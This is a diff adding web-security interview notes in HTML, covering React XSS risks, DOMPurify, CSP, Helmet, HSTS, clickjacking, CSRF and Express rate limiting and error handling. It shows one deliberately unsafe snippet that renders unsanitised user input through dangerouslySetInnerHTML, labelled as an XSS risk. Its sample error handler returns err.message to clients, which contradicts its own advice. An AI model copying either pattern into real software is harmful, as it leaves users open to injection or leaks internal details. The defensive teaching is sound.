+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">dangerous.jsx</span></div>
+              <pre><code>&lt;div dangerouslySetInnerHTML=
+  {{ __html: userInput }} /&gt;</code></pre>
+            </div>
+            <p>Treat as HTML → potential XSS.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-3">
+      <div class="card-sub-title"><h4>dangerouslySetInnerHTML</h4></div>
+      <div class="card-sub-content">
+        <p>React's escape hatch for intentionally inserting HTML:</p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">Component.jsx</span></div>
+          <pre><code><span class="kw">const</span> content = <span class="str">"&lt;h1&gt;Hello&lt;/h1&gt;"</span>;
+
+&lt;div dangerouslySetInnerHTML={{ __html: content }} /&gt;</code></pre>
+        </div>
+        <p>This tells React: "I want this string rendered as real HTML." That's why it's named <em>dangerously</em>.</p>
+        <div class="info-box box-danger">🚨 When <code>content</code> comes from <code>req.body</code> (attacker-controlled), you're saying: user controls HTML → React inserts it → browser parses it → potential XSS.</div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-3 accent-left">
+      <div class="card-sub-title"><h4>When Is It Actually Useful?</h4></div>
+      <div class="card-sub-content">
+        <p>Legitimate cases exist — e.g. a CMS stores real HTML articles. The critical step is <strong>sanitizing first</strong>:</p>
+        <div class="flow">
+          <div class="flow-step">Untrusted HTML</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">HTML Sanitizer (DOMPurify)</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Sanitized HTML</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step" style="border-color:#34d399;color:#6ee7b7">dangerouslySetInnerHTML</div>
+        </div>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">Component.jsx</span></div>
+          <pre><code><span class="kw">import</span> DOMPurify <span class="kw">from</span> <span class="str">"dompurify"</span>;
+
+<span class="kw">const</span> cleanHTML = DOMPurify.<span class="fn">sanitize</span>(userHTML);
+
+&lt;div dangerouslySetInnerHTML={{ __html: cleanHTML }} /&gt;</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-3">
+      <div class="card-sub-title"><h4>XSS Defense — Layered (Defense in Depth)</h4></div>
+      <div class="card-sub-content">
+        <div class="flow">
+          <div class="flow-step">User Input</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Validation → Node/Express → Database</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">React automatic escaping</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">HTML Sanitization (when raw HTML needed)</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">CSP → Browser</div>
+        </div>
+        <p><strong>Key rules:</strong></p>
+        <ul>
+          <li>Treat all user input as untrusted (<code>req.body</code>, <code>req.query</code>, <code>req.params</code>, uploads, external APIs)</li>
+          <li>Prefer normal React rendering: <code>&lt;div&gt;{value}&lt;/div&gt;</code></li>
+          <li>Be extremely careful with <code>dangerouslySetInnerHTML</code></li>
+          <li>Sanitize with DOMPurify when raw HTML is genuinely required</li>
+          <li>Use CSP as an additional defense layer</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="card-sub cat-3 accent-left">
+      <div class="card-sub-title"><h4>XSS vs CSRF — Don't Confuse Them</h4></div>
+      <div class="card-sub-content">
+        <table>
+          <tr><th></th><th>XSS</th><th>CSRF</th></tr>
+          <tr><td>Attack</td><td>Inject malicious script</td><td>Forge authenticated request</td></tr>
+          <tr><td>Main target</td><td>User's browser / page</td><td>Authenticated user's action</td></tr>
+          <tr><td>Typical issue</td><td>Untrusted HTML/JS</td><td>Cookie automatically sent</td></tr>
+          <tr><td>React relevance</td><td>Very high</td><td>Depends on auth mechanism</td></tr>
+          <tr><td>Cookie auth</td><td>Can worsen impact</td><td>Major consideration</td></tr>
+          <tr><td>Main defenses</td><td>Escaping, sanitization, CSP</td><td>SameSite, CSRF tokens, Origin checks</td></tr>
+        </table>
+        <div class="info-box box-tip">💡 <strong>Simplest memory aid:</strong><br>XSS → "Can I make your browser execute my JavaScript?"<br>CSRF → "Can I make your browser send an authenticated request without you intending to?"</div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-3">
+      <div class="card-sub-title"><h4>For Node + React Authentication</h4></div>
+      <div class="card-sub-content">
+        <div class="compare">
+          <div class="compare-box">
+            <h4 style="color:var(--heading)">HttpOnly Cookie</h4>
+            <p style="margin-bottom:0">XSS token theft reduced → <strong>but</strong> CSRF still needs consideration</p>
+          </div>
+          <div class="compare-box">
+            <h4 style="color:var(--heading)">Bearer Token</h4>
+            <p style="margin-bottom:0">Not auto-attached cross-site → classic CSRF risk reduced → <strong>but</strong> token storage / XSS risks must be considered</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    </div>
+
+    <!-- ==================== INTERVIEW Q&A ==================== -->
+    <div class="section-divider" id="qa"><span>Interview Q&amp;A</span></div>
+
+    <div class="card theme-blue">
+      <div class="card-title">💡 Interview Q&amp;A</div>
+      <div class="card-content qa-container">
+
+        <div class="qa-group-title">Standard Questions</div>
+
+        <div class="qa-item">
+          <div class="qa-question">What does the Helmet middleware do?</div>
+          <div class="qa-answer">Helmet sets several HTTP security headers on Express responses (CSP, HSTS, X-Content-Type-Options, X-Frame-Options, etc.) to reduce common web vulnerabilities. It's a single line — <code>app.use(helmet())</code> — that applies sensible security defaults.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">What is Content-Security-Policy and what does it protect against?</div>
+          <div class="qa-answer">CSP tells the browser which sources are allowed to load or execute content (scripts, styles, images, etc.). It's one of the strongest browser-level defenses against XSS — even if malicious script is injected, the browser can refuse to execute it if it violates the policy.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">What is MIME sniffing and how does X-Content-Type-Options: nosniff prevent it?</div>
+          <div class="qa-answer">MIME sniffing is when a browser ignores the declared Content-Type and tries to guess the type itself. <code>nosniff</code> forces the browser to strictly respect the declared type, closing off attacks where malicious content is disguised as a harmless type.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">What does HSTS do, and what doesn't it do?</div>
+          <div class="qa-answer">HSTS tells the browser to only access a site over HTTPS for a specified duration, protecting against downgrade attacks and accidental insecure connections. It does <strong>not</strong> itself enable HTTPS on your server — TLS still has to be configured (usually via reverse proxy/load balancer).</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">What is clickjacking, and how does X-Frame-Options prevent it?</div>
+          <div class="qa-answer">Clickjacking tricks a user into clicking something on your site while it's hidden inside an invisible/disguised iframe on an attacker's page. <code>DENY</code> blocks all framing; <code>SAMEORIGIN</code> allows framing only from the same origin.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Why is centralized error handling preferred over try/catch in every route?</div>
+          <div class="qa-answer">It avoids duplicating error-response logic, keeps formatting consistent, and gives one place to log errors and control what's exposed to the client. Express identifies error middleware by its four-parameter signature: <code>(err, req, res, next)</code>.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">What is XSS?</div>
+          <div class="qa-answer">Cross-Site Scripting — when untrusted user input is interpreted by the browser as executable HTML/JavaScript instead of plain data, allowing an attacker's script to run in a victim's browser session.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Why does React protect against XSS by default?</div>
+          <div class="qa-answer">Because JSX expressions like <code>{value}</code> are automatically escaped before being inserted into the DOM — special characters like <code>&lt;</code> and <code>&gt;</code> become HTML entities, so injected markup is rendered as visible text rather than executed.</div>
+        </div>
+
+        <div class="qa-group-title">Tricky / Follow-Up Questions</div>
+
+        <div class="qa-item">
+          <div class="qa-question">If CSP is set, does that mean XSS is no longer possible?</div>
+          <div class="qa-answer">No. CSP doesn't stop injection of a malicious string — it only restricts what the browser is willing to execute. It's one layer of defense-in-depth, not a replacement for validation, escaping, or sanitization.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">You've enabled HSTS — is your app now secure over HTTP?</div>
+          <div class="qa-answer">No. HSTS only takes effect after the browser has visited the site at least once over HTTPS and received the header. The first request could still be intercepted (preload lists help). HSTS also assumes your server actually serves HTTPS — it doesn't create that capability.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">If you use &lt;div&gt;{userInput}&lt;/div&gt; everywhere, can XSS still happen in a React app?</div>
+          <div class="qa-answer">Yes — through other vectors: <code>dangerouslySetInnerHTML</code> with unsanitized input, unsafely constructed <code>href</code>/<code>src</code> (e.g. <code>javascript:</code> URLs), direct DOM manipulation outside React, or vulnerable third-party packages. React's default escaping only protects JSX text/attribute interpolation.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Does using an HttpOnly cookie for auth make your app immune to XSS?</div>
+          <div class="qa-answer">No. HttpOnly prevents JavaScript from reading the cookie value (e.g. via <code>document.cookie</code>), stopping token theft. But if an attacker can run arbitrary JS via XSS, they can still make authenticated requests, manipulate the DOM, or exfiltrate other data — HttpOnly doesn't stop the underlying XSS vulnerability.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Is X-Frame-Options enough for clickjacking protection today?</div>
+          <div class="qa-answer">It works but is considered legacy. <code>Content-Security-Policy: frame-ancestors</code> is the modern, more flexible replacement. Most teams set both for backward compatibility.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Why not just always sanitize instead of escaping in React?</div>
+          <div class="qa-answer">Escaping (React's default) is safe and cheap for plain text and covers most cases. Sanitizing (DOMPurify) is for the narrower case where you intentionally need real HTML — more expensive and only needed when <code>dangerouslySetInnerHTML</code> is unavoidable.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Can rate limiting alone stop a brute-force login attack?</div>
+          <div class="qa-answer">Not completely. Basic IP-based limiting can be bypassed with distributed requests (botnets, rotating proxies). Combine with account lockouts, CAPTCHA after failures, and monitoring. Rate limiting raises the cost of an attack; it doesn't eliminate it.</div>
+        </div>
+
+        <div class="qa-group-title">Frequently Asked</div>
+
+        <div class="qa-item">
+          <div class="qa-question">What's the difference between authentication middleware and error-handling middleware in Express?</div>
+          <div class="qa-answer">Auth middleware has the standard 3-parameter signature <code>(req, res, next)</code> and runs in the normal pipeline. Error middleware has exactly 4 parameters — <code>(err, req, res, next)</code> — and Express only invokes it when <code>next(err)</code> is called or an error is thrown.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">In what order should security middleware run in Express?</div>
+          <div class="qa-answer">Typically: rate limiter → Helmet → CORS → authentication → authorization → validation → controller → (on error) centralized error handler. Running rate limiting and Helmet early protects unauthenticated routes and rejects abusive traffic before business logic.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">What's the security risk of returning err.stack in an API response?</div>
+          <div class="qa-answer">It can leak internal file paths, database details, library versions, and implementation specifics — useful reconnaissance for an attacker. Always log the full error server-side and return a generic message to the client.</div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Give a real-world example of stored XSS vs reflected XSS.</div>
+          <div class="qa-answer"><strong>Stored:</strong> attacker submits a malicious script in a comment; it's saved and executes for every user who views it later.<br><strong>Reflected:</strong> malicious script is in a URL parameter and immediately echoed in the response (e.g. search page) — only affects the user who clicks that crafted link.</div>
+        </div>
+
+        <div class="qa-group-title">Coding / Theoretical</div>
+
+        <div class="qa-item">
+          <div class="qa-question">Write Express middleware that applies Helmet, a login rate limiter, and a centralized error handler in the correct order.</div>
+          <div class="qa-answer">
+            <div class="code-block">
+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">server.js</span></div>
+              <pre><code><span class="kw">import</span> express <span class="kw">from</span> <span class="str">"express"</span>;
+<span class="kw">import</span> helmet <span class="kw">from</span> <span class="str">"helmet"</span>;
+<span class="kw">import</span> rateLimit <span class="kw">from</span> <span class="str">"express-rate-limit"</span>;
+
+<span class="kw">const</span> app = <span class="fn">express</span>();
+
+<span class="cmt">// 1. Security headers — early, for all routes</span>
+app.<span class="fn">use</span>(<span class="fn">helmet</span>());
+
+<span class="cmt">// 2. Rate limiter — scoped to sensitive route</span>
+<span class="kw">const</span> loginLimiter = <span class="fn">rateLimit</span>({
+  windowMs: <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span>,
+  max: <span class="num">5</span>,
+  message: { message: <span class="str">"Too many login attempts, please try again later"</span> },
+});
+
+app.<span class="fn">post</span>(<span class="str">"/login"</span>, loginLimiter, (req, res) => {
+  <span class="cmt">// ... login logic</span>
+  res.<span class="fn">json</span>({ message: <span class="str">"Login successful"</span> });
+});
+
+<span class="cmt">// 3. Route that can throw</span>
+app.<span class="fn">get</span>(<span class="str">"/users/:id"</span>, (req, res, next) => {
+  <span class="kw">try</span> {
+    <span class="kw">if</span> (req.params.id === <span class="str">"0"</span>) {
+      <span class="kw">throw</span> <span class="kw">new</span> <span class="fn">Error</span>(<span class="str">"Invalid user id"</span>);
+    }
+    res.<span class="fn">json</span>({ id: req.params.id, name: <span class="str">"Sample User"</span> });
+  } <span class="kw">catch</span> (error) {
+    <span class="fn">next</span>(error); <span class="cmt">// forward to error handler</span>
+  }
+});
+
+<span class="cmt">// 4. Centralized error handler — MUST be last (4 params)</span>
+app.<span class="fn">use</span>((err, req, res, next) => {
+  console.<span class="fn">error</span>(err); <span class="cmt">// full detail server-side only</span>
+  res.<span class="fn">status</span>(err.statusCode || <span class="num">500</span>).<span class="fn">json</span>({
+    message: err.message || <span class="str">"Internal Server Error"</span>,
+  });
+});
+
+app.<span class="fn">listen</span>(<span class="num">3000</span>);</code></pre>
+            </div>
+            <p style="margin-top:12px"><strong>Why this order:</strong> Helmet and the rate limiter run before route logic so abusive requests are rejected early. The error handler is defined last — Express only routes to 4-param middleware when <code>next(err)</code> is called.</p>
+          </div>
+        </div>
+
+        <div class="qa-item">
+          <div class="qa-question">Explain why "defense in depth" matters for XSS, using at least three layers.</div>
+          <div class="qa-answer">
+            Any single layer can fail:<br><br>
+            • <strong>React's automatic escaping</strong> only covers JSX interpolation — not <code>dangerouslySetInnerHTML</code> or unsafe URLs.<br>
+            • <strong>Sanitization (DOMPurify)</strong> protects the raw-HTML case but must be applied consistently; a missed spot reintroduces the vulnerability.<br>
+            • <strong>CSP</strong> is a browser-enforced backstop that can block unauthorized script execution even if malicious markup slips through the first two layers.<br><br>
+            Because each layer has a different failure mode, stacking them means an attacker must defeat multiple independent defenses rather than just one.
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+  <footer>Security Headers · Rate Limiting · XSS — Interview Notes</footer>
+
+</body>
+</html>
